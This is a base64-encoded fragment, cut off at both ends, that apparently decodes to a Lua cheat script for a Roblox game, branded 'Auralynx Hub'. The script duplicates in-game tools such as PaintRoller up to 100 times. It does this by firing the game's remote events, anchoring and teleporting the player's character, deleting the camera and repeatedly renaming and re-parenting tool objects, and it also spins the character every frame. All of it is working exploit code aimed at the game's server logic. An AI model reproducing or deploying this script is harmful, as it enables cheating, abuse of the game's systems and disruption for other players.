AgIGVsc2UKICAgICAgICB0YWJsZS5pbnNlcnQoR3JpcFBvc1RhYmxlLCBWZWN0b3IzLm5ldygoaSAtIDEpICogMS4yLCA1LCAwKSkgCiAgICBlbmQKZW5kCgpsb2NhbCB0b29sQ291bnQgPSAwCmZvciBfLCB0b29sIGluIHBhaXJzKGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjazpHZXRDaGlsZHJlbigpKSBkbwogICAgaWYgdG9vbDpJc0EoIlRvb2wiKSBhbmQgdG9vbC5OYW1lID09IHRvb2xzZWxlY3RlZCB0aGVuCiAgICAgICAgdG9vbENvdW50ID0gdG9vbENvdW50ICsgMQogICAgZW5kCmVuZApmb3IgXywgdG9vbCBpbiBwYWlycyhnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkdldENoaWxkcmVuKCkpIGRvCiAgICBpZiB0b29sOklzQSgiVG9vbCIpIGFuZCB0b29sLk5hbWUgPT0gdG9vbHNlbGVjdGVkIHRoZW4KICAgICAgICB0b29sQ291bnQgPSB0b29sQ291bnQgKyAxCiAgICBlbmQKZW5kCgppZiB0b29sQ291bnQgPj0gZHVwZWFtb3QgdGhlbgogICAgLS0gVW5lcXVpcHMgYW5kIG1vdmVzIHRoZSB0b29scyB0byB0aGUgZGVmaW5lZCBwb3NpdGlvbnMKICAgIGZvciBpLCB0b29sIGluIHBhaXJzKGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICBpZiB0b29sOklzQSgiVG9vbCIpIGFuZCB0b29sLk5hbWUgPT0gdG9vbHNlbGVjdGVkIHRoZW4KICAgICAgICAgICAgdG9vbC5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2sKICAgICAgICBlbmQKICAgIGVuZAogICAgZm9yIGksIHRvb2wgaW4gcGFpcnMoZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgaWYgdG9vbDpJc0EoIlRvb2wiKSBhbmQgdG9vbC5OYW1lID09IHRvb2xzZWxlY3RlZCB0aGVuCiAgICAgICAgICAgIHRvb2wuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICBsb2NhbCBncmlwUG9zSW5kZXggPSBtYXRoLm1pbihpLCAjR3JpcFBvc1RhYmxlKQogICAgICAgICAgICBsb2NhbCBncmlwUG9zID0gR3JpcFBvc1RhYmxlW2dyaXBQb3NJbmRleF0KICAgICAgICAgICAgdG9vbC5HcmlwUG9zID0gZ3JpcFBvcwogICAgICAgIGVuZAogICAgZW5kCmVsc2UKICAgIAogICAgbG9jYWwgYXJncyA9IHsKICAgICAgICBbMV0gPSAiQ2xlYXJBbGxUb29scyIKICAgIH0KICAgIAogICAgZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpOldhaXRGb3JDaGlsZCgiUkUiKTpXYWl0Rm9yQ2hpbGQoIjFDbGVhMXJUb29sMXMiKTpGaXJlU2VydmVyKHVucGFjayhhcmdzKSkKICAgIAogICAgd2FpdCgwLjIpCiAgICAKICAgIGdhbWU6R2V0U2VydmljZSgiU3RhcnRlckd1aSIpOlNldENvcmUoIlNlbmROb3RpZmljYXRpb24iLCB7CiAgICAgICAgVGl0bGUgPSAiQXVyYWx5bnggSHViIGlzIGR1cGluZy4uLiIsCiAgICAgICAgVGV4dCA9ICJEb24ndCBjbGljayBvbiBhbnl0aGluZyB3aGlsZSB0aGUgdG9vbHMgYXJlIGJlaW5nIGR1cGVkLiIsCiAgICAgICAgQnV0dG9uMSA9ICJPayIsCiAgICAgICAgRHVyYXRpb24gPSAzCiAgICB9KQogICAgCiAgICBpZiBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkLlNpdCA9PSB0cnVlIHRoZW4KICAgICAgICB0YXNrLndhaXQoKQogICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQuU2l0ID0gZmFsc2UKICAgIGVuZAogICAgCiAgICB3YWl0KDAuMSkKICAgIAogICAgaWYgZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKTpGaW5kRmlyc3RDaGlsZCgiQ2FtZXJhIikgdGhlbgogICAgICAgIGdhbWU6R2V0U2VydmljZSgiV29ya3NwYWNlIik6RmluZEZpcnN0Q2hpbGQoIkNhbWVyYSIpOkRlc3Ryb3koKQogICAgZW5kCiAgICAKICAgIGZvciBtID0gMSwgMiBkbwogICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IENGcmFtZS5uZXcoOTk5OTk5OTk5LjQxNCwgLTQ5MCwgOTk5OTk5OTk5LjQxNCwgMC45NzQzNjA0MDYsIC0wLjE3NTczNDA4OCwgMC4xNDA0OTc2MSwgLTAuMTMzNDQxNDA0LCAwLjA1MTQwNTMwNjksIDAuOTg5NzIyNzI5LCAtMC4xODExNTAzMDIsIC0wLjk4MzA5NDY5MiwgMC4wMjY2MzcwOTIyKQogICAgZW5kCiAgICAKICAgIHRhc2sud2FpdCgwLjIpCiAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQW5jaG9yZWQgPSB0cnVlCiAgICB3YWl0KDAuNSkKICAgIAogICAgZm9yIGFpZGosIGFmaCBpbiBwYWlycyhnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICBpZiBub3QgYWZoLk5hbWUgPT0gdG9vbHNlbGVjdGVkIHRoZW4KICAgICAgICAgICAgaWYgYWZoOklzQSgiVG9vbCIpIHRoZW4KICAgICAgICAgICAgICAgIGFmaC5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2sKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKICAgIAogICAgZm9yIGFpZWZoaWV3aHdmLCBkdmpidmogaW4gcGFpcnMoZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQmFja3BhY2s6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICBpZiBkdmpidmo6SXNBKCJUb29sIikgdGhlbgogICAgICAgICAgICBpZiBub3QgZHZqYnZqLk5hbWUgPT0gdG9vbHNlbGVjdGVkIHRoZW4KICAgICAgICAgICAgICAgIGR2amJ2ajpEZXN0cm95KCkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKICAgIAogICAgZm9yIHR0anRqdXRqdXRqanRqLCBkZHZkdmRzdmRmYnJueXR5dG12ZHYgaW4gcGFpcnMoZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgaWYgZGR2ZHZkc3ZkZmJybnl0eXRtdmR2OklzQSgiVG9vbCIpIHRoZW4KICAgICAgICAgICAgaWYgbm90IGRkdmR2ZHN2ZGZicm55dHl0bXZkdi5uYW1lID09IHRvb2xzZWxlY3RlZCB0aGVuCiAgICAgICAgICAgICAgICBkZHZkdmRzdmRmYnJueXR5dG12ZHY6RGVzdHJveSgpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCiAgICAKICAgIGZvciBmaW5kaW4sIHRvb2xsZWwgaW4gcGFpcnMoZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgaWYgdG9vbGxlbDpJc0EoIlRvb2wiKSB0aGVuCiAgICAgICAgICAgIGlmIHRvb2xsZWwuTmFtZSA9PSB0b29sc2VsZWN0ZWQgdGhlbgogICAgICAgICAgICAgICAgdG9vbGxsbGZvdW4yID0gdHJ1ZQogICAgICAgICAgICAgICAgZm9yIGJhc2MsIGFpamZ3IGluIHBhaXJzKHRvb2xsZWw6R2V0RGVzY2VuZGFudHMoKSkgZG8KICAgICAgICAgICAgICAgICAgICBpZiBhaWpmdy5OYW1lID09ICJIYW5kbGUiIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgYWlqZncuTmFtZSA9ICJIw6LCpWHDosKlbsOiwqVkw6LCpWzDosKlZSIKICAgICAgICAgICAgICAgICAgICAgICAgdG9vbGxlbC5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2sKICAgICAgICAgICAgICAgICAgICAgICAgdG9vbGxlbC5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgICAgIHRvbGxsYWhoaGggPSB0b29sbGVsCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgdG9vbGxsbGZvdW4yID0gZmFsc2UKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKICAgIAogICAgZm9yIGZpaWZpLCB0b29sbGxsIGluIHBhaXJzKGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkJhY2twYWNrOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgaWYgdG9vbGxsbDpJc0EoIlRvb2wiKSB0aGVuCiAgICAgICAgICAgIGlmIHRvb2xsbGwuTmFtZSA9PSB0b29sc2VsZWN0ZWQgdGhlbgogICAgICAgICAgICAgICAgdG9vbGxsbGZvdW4gPSB0cnVlCiAgICAgICAgICAgICAgICBmb3IgbmFuYSwgampzanNqIGluIHBhaXJzKHRvb2xsbGw6R2V0RGVzY2VuZGFudHMoKSkgZG8KICAgICAgICAgICAgICAgICAgICBpZiBqanNqc2ouTmFtZSA9PSAiSGFuZGxlIiB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHRvb2xsbGwuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgICAgICB3YWl0KCkKICAgICAgICAgICAgICAgICAgICAgICAgampzanNqLk5hbWUgPSAiSMOiwqVhw6LCpW7DosKlZMOiwqVsw6LCpWUiCiAgICAgICAgICAgICAgICAgICAgICAgIHRvb2xsbGwuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrCiAgICAgICAgICAgICAgICAgICAgICAgIHRvb2xsbGwuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgICAgICB0b29sbGxmZmVsID0gdG9vbGxsbAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIHRvb2xsbGxmb3VuID0gZmFsc2UKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKICAgIAogICAgaWYgdG9vbGxsbGZvdW4gPT0gdHJ1ZSB0aGVuCiAgICAgICAgaWYgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCh0b29sbGxmZmVsKSA9PSBuaWwgdGhlbgogICAgICAgICAgICB0b29sbGxsZm91biA9IGZhbHNlCiAgICAgICAgZW5kCiAgICAgICAgcmVwZWF0CiAgICAgICAgICAgIHdhaXQoKQogICAgICAgIHVudGlsIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQodG9vbGxsZmZlbCkgPT0gbmlsCiAgICAgICAgdG9vbGxsbGZvdW4gPSBmYWxzZQogICAgZW5kCiAgICAKICAgIGlmIHRvb2xsbGxmb3VuMiA9PSB0cnVlIHRoZW4KICAgICAgICBpZiBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKHRvbGxsbGFoaGhoKSA9PSBuaWwgdGhlbgogICAgICAgICAgICB0b29sbGxsZm91bjIgPSBmYWxzZQogICAgICAgIGVuZAogICAgICAgIHJlcGVhdAogICAgICAgICAgICB3YWl0KCkKICAgICAgICB1bnRpbCBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKHRvbGxsbGFoaGhoKSA9PSBuaWwKICAgICAgICB0b29sbGxsZm91bjIgPSBmYWxzZQogICAgZW5kCiAgICAKICAgIHdhaXQoMC4xKQogICAgCiAgICBmb3IgbSA9IDEsIGR1cGVhbW90IGRvCiAgICAgICAgaWYgZHVwaW5nID09IGZhbHNlIHRoZW4KICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkFuY2hvcmVkID0gZmFsc2UKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgZW5kCiAgICAgICAgaWYgZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKTpGaW5kRmlyc3RDaGlsZCgiQ2FtZXJhIikgdGhlbgogICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpOkZpbmRGaXJzdENoaWxkKCJDYW1lcmEiKTpEZXN0cm95KCkKICAgICAgICBlbmQKICAgICAgICBpZiBtIDw9IGR1cGVhbW90IHRoZW4KICAgICAgICBlbHNlaWYgbSA9PSBkdXBlYW1vdCBvciBtID49IGR1cGVhbW90IC0gMSB0aGVuCiAgICAgICAgZW5kCiAgICAgICAgbG9jYWwgYXJncyA9IHsKICAgICAgICAgICAgWzFdID0gIlBpY2tpbmdUb29scyIsCiAgICAgICAgICAgIFsyXSA9IHRvb2xzZWxlY3RlZAogICAgICAgIH0KICAgICAgICBwaWNrdG9vbHJlbW90ZTpJbnZva2VTZXJ2ZXIodW5wYWNrKGFyZ3MpKQogICAgICAgIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkJhY2twYWNrOldhaXRGb3JDaGlsZCh0b29sc2VsZWN0ZWQpLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICBpZiBkdXBpbmcgPT0gZmFsc2UgdGhlbgogICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQW5jaG9yZWQgPSBmYWxzZQogICAgICAgICAgICByZXR1cm4KICAgICAgICBlbmQKICAgICAgICB3YWl0KCkKICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXJbdG9vbHNlbGVjdGVkXTpGaW5kRmlyc3RDaGlsZCgiSGFuZGxlIikuTmFtZSA9ICJIw6LCpWHDosKlbsOiwqVkw6LCpWzDosKlZSIKICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQodG9vbHNlbGVjdGVkKS5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2sKICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5CYWNrcGFjazpGaW5kRmlyc3RDaGlsZCh0b29sc2VsZWN0ZWQpLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlN0YXJ0ZXJHdWkiKTpTZXRDb3JlKCJTZW5kTm90aWZpY2F0aW9uIiwgewogICAgICAgICAgICBUaXRsZSA9ICJBdXJhbHlueCBIdWIiLAogICAgICAgICAgICBUZXh0ID0gIlRvb2wocykgZHVwZWQ6ICIgLi4gbSAuLiAiIC8gIiAuLiBkdXBlYW1vdCwKICAgICAgICAgICAgRHVyYXRpb24gPSAxCiAgICAgICAgfSkKICAgICAgICByZXBlYXQKICAgICAgICAgICAgaWYgZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKTpGaW5kRmlyc3RDaGlsZCgiQ2FtZXJhIikgdGhlbgogICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKTpGaW5kRmlyc3RDaGlsZCgiQ2FtZXJhIik6RGVzdHJveSgpCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgIHVudGlsIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCh0b29sc2VsZWN0ZWQpID09IG5pbAogICAgZW5kCiAgICAKICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5BbmNob3JlZCA9IGZhbHNlCiAgICByZXBlYXQKICAgICAgICB3YWl0KCkKICAgIHVudGlsIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSA9PSBuaWwKICAgIHJlcGVhdAogICAgICAgIHdhaXQoKQogICAgdW50aWwgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gb2xkY2YKICAgIAogICAgZm9yIHosIHggaW4gcGFpcnMoZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgaWYgeC5OYW1lID09IHRvb2xzZWxlY3RlZCB0aGVuCiAgICAgICAgICAgIHRvb2xhbW91dGggPSB6CiAgICAgICAgZW5kCiAgICBlbmQKICAgIAogICAgd2FpdCgpCiAgICBkdXBpbmcgPSBmYWxzZQogICAgd2FpdCgwLjEpCiAgICAKICAgIGZvciBpLCB0b29sIGluIHBhaXJzKGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjazpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgIGlmIHRvb2w6SXNBKCJUb29sIikgdGhlbgogICAgICAgICAgICB0b29sLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgbG9jYWwgZ3JpcFBvc0luZGV4ID0gbWF0aC5taW4oaSwgI0dyaXBQb3NUYWJsZSkKICAgICAgICAgICAgbG9jYWwgZ3JpcFBvcyA9IEdyaXBQb3NUYWJsZVtncmlwUG9zSW5kZXhdCiAgICAgICAgICAgIGlmIHRvb2w6SXNEZXNjZW5kYW50T2YoZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcikgdGhlbgogICAgICAgICAgICAgICAgdG9vbC5HcmlwUG9zID0gZ3JpcFBvcwogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICB3YXJuKCJUb29sIiwgdG9vbC5OYW1lLCAiaXMgbm90IGluIGNoYXJhY3RlciIpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCiAgICAKICAgIHdhaXQoMSkKICAgIAogICAgZnVuY3Rpb24gRXF1aXBFdmVyeXRoaW5nKCkKICAgICAgICAKICAgICAgICBsb2NhbCBwbGF5ZXIgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllcgogICAgICAgIAogICAgICAgIAogICAgICAgIGxvY2FsIGZ1bmN0aW9uIGNoYW5nZUFuaW1hdGlvbih0b29sKSAgCiAgICAgICAgICAgIGlmIHRvb2w6RmluZEZpcnN0Q2hpbGQoIkN5Y2xlTmV4dEFuaW1hdGlvbiIpIHRoZW4gIAogICAgICAgICAgICAgICAgdG9vbC5DeWNsZU5leHRBbmltYXRpb246RmlyZVNlcnZlcigpICAKICAgICAgICAgICAgZW5kICAKICAgICAgICBlbmQKICAgICAgICAKICAgICAgICAKICAgICAgICBmb3IgXywgdG9vbCBpbiBpcGFpcnMocGxheWVyLkJhY2twYWNrOkdldENoaWxkcmVuKCkpIGRvICAKICAgICAgICAgICAgaWYgdG9vbDpJc0EoIlRvb2wiKSBhbmQgdG9vbC5OYW1lID09ICJQYWludFJvbGxlciIgdGhlbiAgCiAgICAgICAgICAgICAgICBjaGFuZ2VBbmltYXRpb24odG9vbCkgIAogICAgICAgICAgICBlbmQgIAogICAgICAgIGVuZAogICAgICAgIAogICAgICAgIAogICAgICAgIGxvY2FsIGNoYXJhY3RlciA9IHBsYXllci5DaGFyYWN0ZXIgb3IgcGxheWVyLkNoYXJhY3RlckFkZGVkOldhaXQoKSAgCiAgICAgICAgZm9yIF8sIHRvb2wgaW4gaXBhaXJzKGNoYXJhY3RlcjpHZXRDaGlsZHJlbigpKSBkbyAgCiAgICAgICAgICAgIGlmIHRvb2w6SXNBKCJUb29sIikgYW5kIHRvb2wuTmFtZSA9PSAiUGFpbnRSb2xsZXIiIHRoZW4gIAogICAgICAgICAgICAgICAgY2hhbmdlQW5pbWF0aW9uKHRvb2wpICAKICAgICAgICAgICAgZW5kICAKICAgICAgICBlbmQKICAgICAgICAKICAgIGVuZAogICAgCiAgICBFcXVpcEV2ZXJ5dGhpbmcoKQogICAgd2FpdCgxKQogICAgRXF1aXBFdmVyeXRoaW5nKCkKICAgIHdhaXQoMSkKICAgIEVxdWlwRXZlcnl0aGluZygpCiAgICAKICAgIGZ1bmN0aW9uIHN0YXJ0U3BpbigpCiAgICAgICAgbG9jYWwgUGxheWVycyA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpCiAgICAgICAgbG9jYWwgUnVuU2VydmljZSA9IGdhbWU6R2V0U2VydmljZSgiUnVuU2VydmljZSIpCiAgICAgICAgbG9jYWwgcGxheWVyID0gUGxheWVycy5Mb2NhbFBsYXllcgogICAgICAgIGxvY2FsIGNoYXJhY3RlciA9IHBsYXllci5DaGFyYWN0ZXIgb3IgcGxheWVyLkNoYXJhY3RlckFkZGVkOldhaXQoKQogICAgICAgIGxvY2FsIHJvb3RQYXJ0ID0gY2hhcmFjdGVyOldhaXRGb3JDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgCiAgICAgICAgdGFzay53YWl0KDEpICAKICAgICAgICAKICAgICAgICBsb2NhbCBzcGluU3BlZWQgPSBtYXRoLnJhZCgxNzUwKSAKICAKICAgICAgICBSdW5TZXJ2aWNlLlJlbmRlclN0ZXBwZWQ6Q29ubmVjdChmdW5jdGlvbihkdCkgIAogICAgICAgICAgICByb290UGFydC5DRnJhbWUgPSByb290UGFydC5DRnJhbWUgKiBDRnJhbWUuQW5nbGVzKDAsIHNwaW5TcGVlZCAqIGR0LCAwKSAgCiAgICAgICAgZW5kKQogICAgICAgIAogICAgZW5kCiAgICAKICAgIHN0YXJ0U3BpbigpCmVuZAogICAgZW5kCn0pCgpUb29sc1RhYjpBZGRCdXR0b24oewogICAgTmFtZSA9ICJDb2xvciBNYXAgU2t5IiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgbG9jYWwgdG9vbHNlbGVjdGVkID0gIlBhaW50Um9sbGVyIgpsb2NhbCBkdXBlYW1vdCA9IDEwMApsb2NhbCBwaWNrdG9vbHJlbW90ZSA9IGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5SRTpGaW5kRmlyc3RDaGlsZCgiMVRvbzFsIikKbG9jYWwgY2xlYXJ0b29scmVtb3RlID0gZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpLlJFOkZpbmRGaXJzdENoaWxkKCIxQ2xlYTFyVG9vbDFzIikKbG9jYWwgZHVwaW5nID0gdHJ1ZQpsb2NhbCBvbGRjZiA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUKCgpsb2NhbCBHcmlwUG9zVGFibGUgPSB7fQpmb3IgaSA9IDEsIDEwMCBkbwogICAgaWYgaSA9PSAxIHRoZW4KICAgICAgICB0YWJsZS5pbnNlcnQoR3JpcFBvc1RhYmxlLCBWZWN0b3IzLm5ldygyLCA1MCwgLTUwKSkgCiAgICBlbHNlCiAgICAgICAgdGFibGUuaW5zZXJ0KEdyaXBQb3NUYWJsZSwgVmVjdG9yMy5uZXcoKGkgLSAxKSAqIDIsIDUwLCAtNTApKSAKICAgIGVuZAplbmQKCmxvY2FsIHRvb2xDb3VudCA9IDAKZm9yIF8sIHRvb2wgaW4gcGFpcnMoZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrOkdldENoaWxkcmVuKCkpIGRvCiAgICBpZiB0b29sOklzQSgiVG9vbCIpIGFuZCB0b29sLk5hbWUgPT0gdG9vbHNlbGVjdGVkIHRoZW4KICAgICAgICB0b29sQ291bnQgPSB0b29sQ291bnQgKyAxCiAgICBlbmQKZW5kCmZvciBfLCB0b29sIGluIHBhaXJzKGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6R2V0Q2hpbGRyZW4oKSkgZG8KICAgIGlmIHRvb2w6SXNBKCJUb29sIikgYW5kIHRvb2wuTmFtZSA9PSB0b29sc2VsZWN0ZWQgdGhlbgogICAgICAgIHRvb2xDb3VudCA9IHRvb2xDb3VudCArIDEKICAgIGVuZAplbmQKCmlmIHRvb2xDb3VudCA+PSBkdXBlYW1vdCB0aGVuCiAgICAtLSBVbmVxdWlwcyBhbmQgbW92ZXMgdGhlIHRvb2xzIHRvIHRoZSBkZWZpbmVkIHBvc2l0aW9ucwogICAgZm9yIGksIHRvb2wgaW4gcGFpcnMoZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgIGlmIHRvb2w6SXNBKCJUb29sIikgYW5kIHRvb2wuTmFtZSA9PSB0b29sc2VsZWN0ZWQgdGhlbgogICAgICAgICAgICB0b29sLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjawogICAgICAgIGVuZAogICAgZW5kCiAgICBmb3IgaSwgdG9vbCBpbiBwYWlycyhnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2s6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICBpZiB0b29sOklzQSgiVG9vbCIpIGFuZCB0b29sLk5hbWUgPT0gdG9vbHNlbGVjdGVkIHRoZW4KICAgICAgICAgICAgdG9vbC5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgIGxvY2FsIGdyaXBQb3NJbmRleCA9IG1hdGgubWluKGksICNHcmlwUG9zVGFibGUpCiAgICAgICAgICAgIGxvY2FsIGdyaXBQb3MgPSBHcmlwUG9zVGFibGVbZ3JpcFBvc0luZGV4XQogICAgICAgICAgICB0b29sLkdyaXBQb3MgPSBncmlwUG9zCiAgICAgICAgZW5kCiAgICBlbmQKZWxzZQogICAgCiAgICBsb2NhbCBhcmdzID0gewogICAgICAgIFsxXSA9ICJDbGVhckFsbFRvb2xzIgogICAgfQogICAgCiAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIik6V2FpdEZvckNoaWxkKCJSRSIpOldhaXRGb3JDaGlsZCgiMUNsZWExclRvb2wxcyIpOkZpcmVTZXJ2ZXIodW5wYWNrKGFyZ3MpKQogICAgCiAgICB3YWl0KDAuMikKICAgIAogICAgZ2FtZTpHZXRTZXJ2aWNlKCJTdGFydGVyR3VpIik6U2V0Q29yZSgiU2VuZE5vdGlmaWNhdGlvbiIsIHsKICAgICAgICBUaXRsZSA9ICJBdXJhbHlueCBIdWIgaXMgZHVwaW5nLi4uIiwKICAgICAgICBUZXh0ID0gIkRvbid0IGNsaWNrIG9uIGFueXRoaW5nIHdoaWxlIHRoZSB0b29scyBhcmUgYmVpbmcgZHVwZWQuIiwKICAgICAgICBCdXR0b24xID0gIk9rIiwKICAgICAgICBEdXJhdGlvbiA9IDMKICAgIH0pCiAgICAKICAgIGlmIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQuU2l0ID09IHRydWUgdGhlbgogICAgICAgIHRhc2sud2FpdCg